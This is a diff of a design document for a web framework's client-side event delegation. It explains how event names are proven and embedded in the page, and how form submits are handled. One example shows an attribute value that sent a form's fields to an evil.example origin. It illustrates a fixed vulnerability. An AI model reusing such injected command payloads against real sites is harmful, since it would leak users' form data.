@@ -26,7 +26,7 @@ always true, `sendEvent` warns and drops (`push_event "<name>" dropped: this pag
 `navigate`/`leavePage` load the URL as a page (`loadPage`, http(s) only), and a transition waits for
 no reply. It exports `start`, `executeJS`, `exitPip`, `requestPip`, `mountHooks`, `hooks`, `get`,
 `set`, `setAll`. `start({attrs}?)` binds delegation, notes the event names (`attrs`, else the JSON
-list `arizona_static` embedded in `#arizona-attrs`), mounts hooks, and returns an idempotent `stop`
+list `arizona_static` embedded in `#arizona-attrs`, read by the shared `embeddedAttrs`), mounts hooks, and returns an idempotent `stop`
 (unbinds, closes PiP windows, destroys hooks); a second `start()` stops the first. The host member
 `ready` -- whether delegated commands run now -- is the socket being open on a live page. The static
 bundle must never grow a Worker or a socket: anything it needs from the live side goes through
@@ -92,9 +92,29 @@ command-versus-data question is answerable, and the delivery uses both (`arizona
   `"a"` on the **same frame** that first renders the markup, so the type is bound before anything
   can trigger it. After connect, frames carry no `"a"` at all unless something new was proved.
 
+**The page carries its set too, so it is known before the socket opens.** The connect frame lands
+a round trip after the open, and a click in that window -- or an HTTP-form `az-submit` `fetch`,
+which runs with no socket at all -- must find its proof. So the HTTP render arms the same
+collector for the page and embeds the union (`arizona_event_attrs:embed/2`, the render target's
+`static_document/2`: `<script type="application/json" id="arizona-attrs">` before the last
+`</body>`), exactly as `arizona_static` does for a static page, and `connect()` reads it
+(`embeddedAttrs`) before anything can fire. A page with nowhere to embed (a fragment with no
+`</body>`, a `?json` document) has no proofs until the connect frame, and runs nothing before it.
+There is **no bootstrap set**: delegating common types (`click`, `change`, ...) ahead of any proof
+used to cover that window, and it ran app data under those names as commands -- an
+`az-change='[22,"https://evil.example",{}]'` posted the form's fields to another origin.
+
 The worker relays each frame's `"a"` as field 4 of
 `postMessage([0, ops, effects, firstAfterReconnect, azNames])`; the main thread decides which names
-are events and unions monotonically.
+are events and unions monotonically, over what the page embedded.
+
+**Every executor gates on the proven set (`_eventTypes`), never on which listeners exist.** The
+generic listeners are bound only for proven types, which is the only way one gets bound. The
+dedicated `submit` and `drop` listeners are bound on every page (they carry bookkeeping), so each
+asks `proven` before parsing its attribute; an unproven `az-submit` is still `preventDefault`ed
+(see below) and runs nothing. The reconnect replay proposes a form's `az-change` or a field's
+`az-change`/`az-input` only under a proven name (`proposing`). A `submit` or `drop` proof is
+recorded beside the others but binds no generic listener (`DEDICATED`).
 
 Deriving the set from rendered bytes instead was tried and abandoned. A regex over serialized HTML
 cannot tell an attribute NAME from `az-` text inside an attribute VALUE, so user content echoed
@@ -111,9 +131,12 @@ is a bare JSON array (`arizona_effect:encode/1` emits a single command unwrapped
 `[1,2,3]` is a structurally valid command -- `toggle` with selector `2` -- and **no client-side
 inspection of the value can separate the two**. Delegating on guesswork would both leave declared
 events dead and hand app data (possibly attacker-influenced) to the command interpreter; the typed
-proofs above are what make neither happen. The delegated dispatch still wraps parse AND execution
-in a warn-once containment, because a proven name can share the DOM with same-named app data (a
-runtime `set_attr`, host markup).
+proofs above are what make neither happen. The proof is per **name**, not per element: a name
+proven anywhere on the page runs a same-named data value elsewhere on it (`az-change` proven on one
+form makes another form's `az-change` data a command list), so never render untrusted data under
+an `az-*` name the page also uses for commands. Per-element marking would be a separate design. The
+delegated dispatch still wraps parse AND execution in a warn-once containment for the same reason
+(a runtime `set_attr`, host markup).
 
 **Two listeners per type, split on the event's own `bubbles` flag**, because one phase cannot serve
 both kinds:
@@ -154,9 +177,9 @@ The flag must be **stated in both directions**: omitting it entirely makes Chrom
 **`submit` and `drop` are deliberately not delegated generically.** They name real DOM events *and*
 have dedicated listeners (submit flushes pending debounced inputs, honors `az-form-reset`, and
 defers the reset to a `fetch` response; drop carries the drag bookkeeping), so delegating them as
-well would run their commands twice. They sit in `AZ_DIRECTIVES` beside the `az-*` names that are
-directives rather than events. The flush covers the form's own slots too (a form-level
-`az-debounce` paces the field events it delegates), and a submit is never debounced itself --
+well would run their commands twice. They sit in `DEDICATED`: recorded as proven like any event,
+never bound generically, beside the `AZ_DIRECTIVES` that name no event at all. The flush covers
+the form's own slots too (a form-level `az-debounce` paces the field events it delegates), and a submit is never debounced itself --
 `az-debounce="blur"` on a form would otherwise never send it -- while `az-throttle` still paces
 a `push_event` submit (a second submit inside the window becomes its trailing send). No flush
 touches the submit's own slot -- not the submit flush, nor a blur or event-name flush on the
@@ -173,7 +196,7 @@ submits it with the form's own method -- a GET by default, putting every field (
 included) in the URL -- which is what happened before the first open and during reconnect backoff.
 That holds for a form with an explicit `method`/`action` too: it no longer falls back to a native
 submission while disconnected. The listener always calls `preventDefault`, then decides by what
-the commands need (`socketNeeds`):
+the commands need (`socketNeeds`) -- when `az-submit` is proven; an unproven one runs nothing:
 
 - **An SPA `navigate`/`patch` alone** (top level or under `transition`) degrades to a full load of
   its URL (`location.assign`, or `location.replace` for a `replace` navigate), exactly what a
@@ -184,7 +207,9 @@ the commands need (`socketNeeds`):
   the rest would apply half a submission and discard the typed fields. Every drop warns and
   dispatches a non-cancelable, bubbling `arizona:submit-dropped` `CustomEvent` on the form,
   `detail: {reason: 'disconnected'}`, so the app can tell the user.
-- **A `fetch` or client-only list** runs: an HTTP login form needs no socket.
+- **A `fetch` or client-only list** runs: an HTTP login form needs no socket. It runs under the
+  page's embedded proof of `az-submit`, so on a page with nowhere to embed it waits for the
+  connect frame.
 
 Queueing for the reconnect was rejected: a submit replayed seconds later, against a view the resync
 may have remounted, is not what the user pressed. To disable the submit button while down, style it
@@ -207,7 +232,9 @@ imply nothing.
   just wrote.
 - **`?raw` markup and host-inserted DOM** declare nothing the compiler saw. Call the exported
   `mountHooks` on it, the same contract hooks already have; it walks with `getAttributeNames()`,
-  which is exact because the parser already did the parsing. Calling it on already-mounted markup is
+  which is exact because the parser already did the parsing. That call **is** the proof: every
+  `az-*` name on the markup becomes a proven type for the page, so call it only on markup whose
+  `az-*` attributes the host wrote itself, never on markup holding untrusted data. Calling it on already-mounted markup is
   safe (`mountHook` returns early for an element it already tracks).
 - **Window-targeted events** (`resize`, `online`/`offline`, `hashchange`, `popstate`, `storage`)
   are not delegated at all: delegation binds on Documents, and their propagation path does not
